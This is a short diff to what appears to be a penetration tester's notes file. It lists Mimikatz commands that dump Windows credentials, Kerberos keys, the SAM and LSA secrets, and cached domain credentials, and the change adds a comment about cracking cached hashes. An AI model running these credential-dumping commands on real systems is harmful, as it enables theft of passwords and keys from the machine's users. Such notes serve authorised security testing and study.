@@ -15,7 +15,7 @@ sekurlsa::credman # windows credential manager
 sekurlsa::ekeys # Kerberos keys
 lsadump::sam
 lsadump::lsa
-lsadump::cache
+lsadump::cache  # Make note of ITERATIONS... see Cracking notes section
 lsadump::secrets
 
 lsadump::sam SystemBkup.hiv SamBkup.hiv
